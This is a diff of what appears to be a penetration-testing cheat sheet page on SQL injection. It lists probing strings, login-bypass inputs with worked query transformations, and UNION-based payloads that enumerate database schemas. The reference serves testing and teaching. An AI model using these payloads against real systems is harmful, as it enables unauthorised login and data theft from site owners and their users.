@@ -218,60 +218,51 @@ layout: default
         </table>
     </ul>
 
-    <h4>Sql Injections:</h4>
-
     <table>
         <tr>
             <td>Test for sql injections</td>
-            <td>'<br>""<br>;<br>' or '1'='1-- -<br>' or 1=2-- -</td>
+            <td>' or 1=1-- -<br>a' or 1=1-- -<br>' or 1=2-- -<br>a' or 1=2-- -</td>
         </tr>
     </table>
 
+    <li>Examples of login bypass:</li>
     <table>
         <tr>
-            <td>Bypass login</td>
+            <td>USERNAME:</td>
+            <td>admin' or 'a'='a</td>
+        </tr>
+        <tr>
+            <td>PASSWORD:</td>
+            <td>'#</td>
+        </tr>
+        <tr>
             <td>
-                ' or 1=1 --<br>' or 1=1-- -<br>' or 1=1-- -;<br>a' or 1=1 --<br>" or 1=1 --<br>a" or 1=1 --<br>' or 1=1 #<br>" or 1=1 #<br>or 1=1 --<br>' or 'x'='x<br>" or "x"="x<br>') or ('x'='x<br>") or ("x"="x<br>' or username LIKE '%admin%<br>
-                <li>Login bypass examples:</li>
-                <table>
-                    <tr>
-                        <td>USERNAME:</td>
-                        <td>admin' or 'a'='a</td>
-                    </tr>
-                    <tr>
-                        <td>PASSWORD:</td>
-                        <td>'#</td>
-                    </tr>
-                    <tr>
-                        <td>
-                            <li>SELECT * FROM users WHERE username = '" + formusr + "' AND password ='" + formpwd + "'";</li>
-                            <br>turns into:<br>
-                            <li>SELECT * FROM users WHERE username = 'admin' AND password = '' or 'a'='a'</li>
-                        </td>
-                    </tr>
-                    <tr>
-                        <td> </td>
-                        <td> </td>
-                    </tr>
-                    <tr>
-                        <td>USERNAME:</td>
-                        <td>' or 1=1 --</td>
-                    </tr>
-                    <tr>
-                        <td>PASSWORD:</td>
-                        <td>&lt;anything&gt;</td>
-                    </tr>
-                    <tr>
-                        <td>
-                            <li>SELECT * FROM users WHERE username = '" + formusr + "' AND password ='" + formpwd + "'";</li>
-                            <br>turns into:<br>
-                            <li>SELECT * FROM users WHERE username = '' or 1=1 -- AND password = '&lt;anything&gt;'</li>
-                        </td>
-                    </tr>
-                </table>
+                <li>SELECT * FROM users WHERE username = '" + formusr + "' AND password ='" + formpwd + "'";</li>
+                <br>turns into:<br>
+                <li>SELECT * FROM users WHERE username = 'admin' AND password = '' or 'a'='a'</li>
+            </td>
+        </tr>
+        <tr>
+            <td> </td>
+            <td> </td>
+        </tr>
+        <tr>
+            <td>USERNAME:</td>
+            <td>' or 1=1-- -</td>
+        </tr>
+        <tr>
+            <td>PASSWORD:</td>
+            <td>&lt;anything&gt;</td>
+        </tr>
+        <tr>
+            <td>
+                <li>SELECT * FROM users WHERE username = '" + formusr + "' AND password ='" + formpwd + "'";</li>
+                <br>turns into:<br>
+                <li>SELECT * FROM users WHERE username = '' or 1=1 -- AND password = '&lt;anything&gt;'</li>
             </td>
         </tr>
     </table>
+
 
     <h4>SQL Injection Error Attack</h4>
     <ul>
@@ -439,21 +430,23 @@ layout: default
     </ul>
 
     <h4>SQL Injection Union Attack</h4>
+    
+    <ul>
 
-    <li>Quick method - Group_concat</li>
+        <li>Quick method - Group_concat</li>
 
-    <table>
-        <tr>
-            <td>Enumerate DB Names</td>
-            <td>
-                <table>
-                    <tr>
-                        <td>Format 1</td>
-                        <td>1 and 1=2 UNION SELECT 1,group_concat(schema_name),3,4<mark>...(Enumerate # to go up to using &#039; order by &lt;#&gt;-- -)</mark> from information_schema.schemata-- -</td>
-                    </tr>
-                    <tr>
-                        <td>Format 2</td>
-                        <td>' UNION SELECT 1,group_concat(schema_name),3,4<mark>...(Enumerate # to go up to using ' order by <#>-- -)</mark> from information_schema.schemata-- -</td>
+        <table>
+            <tr>
+                <td>Enumerate DB Names</td>
+                <td>
+                    <table>
+                        <tr>
+                            <td>Format 1</td>
+                            <td>1 and 1=2 UNION SELECT 1,group_concat(schema_name),3,4<mark>...(Enumerate # to go up to using &#039; order by &lt;#&gt;-- -)</mark> from information_schema.schemata-- -</td>
+                        </tr>
+                        <tr>
+                            <td>Format 2</td>
+                            <td>' UNION SELECT 1,group_concat(schema_name),3,4<mark>...(Enumerate # to go up to using ' order by &lt;#&gt;-- -)</mark> from information_schema.schemata-- -</td>
                         </tr>
                     </table>
                 </td>
